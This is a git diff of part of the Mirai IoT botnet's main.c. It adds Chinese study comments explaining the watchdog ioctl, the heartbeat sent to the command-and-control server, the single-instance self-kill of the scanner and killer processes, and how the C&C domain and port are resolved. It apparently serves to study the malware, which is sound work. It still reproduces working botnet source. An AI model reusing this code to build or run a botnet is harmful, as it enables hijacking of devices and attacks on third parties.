@@ -79,7 +79,7 @@ int main(int argc, char **args)
     {
         int one = 1;
 
-        ioctl(wfd, 0x80045704, &one);
+        ioctl(wfd, 0x80045704, &one);   //cmd是0x80045704    这个看watchdog的驱动才看得懂吧
         close(wfd);
         wfd = 0;
     }
@@ -222,7 +222,7 @@ int main(int argc, char **args)
             uint16_t len = 0;
 
             if (pings++ % 6 == 0)   //心跳包　　每隔６０秒发送一次
-                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
+                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);  //心跳包2个字节
         }
 
         // Check if we need to kill ourselves　　多实例检测，确保只有一个进程运行
@@ -237,9 +237,9 @@ int main(int argc, char **args)
             printf("[main] Detected newer instance running! Killing self\n");
 #endif
 #ifdef MIRAI_TELNET
-            scanner_kill();//kill掉自己
+            scanner_kill();//kill掉scanner进程
 #endif
-            killer_kill();
+            killer_kill();//kill掉killer进程
             attack_kill_all();
             kill(pgid * -1, 9);
             exit(0);
@@ -372,13 +372,14 @@ static void anti_gdb_entry(int sig)
     resolve_func = resolve_cnc_addr;//啥？
 }
 
-//获取cnc域名和端口
+//获取cnc域名和端口 
 static void resolve_cnc_addr(void)
 {
     struct resolv_entries *entries;
 
     table_unlock_val(TABLE_CNC_DOMAIN);
-    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    //TABLE_CNC_DOMAIN 是用户配置的
+    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));  //根据域名得到IP
     table_lock_val(TABLE_CNC_DOMAIN);
     if (entries == NULL)
     {
@@ -387,11 +388,13 @@ static void resolve_cnc_addr(void)
 #endif
         return;
     }
-    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+
+    //全局的
+    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];  //rand_next()是啥？？
     resolv_entries_free(entries);
 
     table_unlock_val(TABLE_CNC_PORT);
-    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
+    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL)); //取得端口
     table_lock_val(TABLE_CNC_PORT);
 
 #ifdef DEBUG
@@ -425,12 +428,8 @@ static void establish_connection(void)
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
 }
 
-<<<<<<< HEAD
 
-//关闭与CNC的连接
-=======
 //断开与CNC的连接
->>>>>>> 1c1ee4590de0f564774b0eefe76f70b38bd2e176
 static void teardown_connection(void)
 {
 #ifdef DEBUG
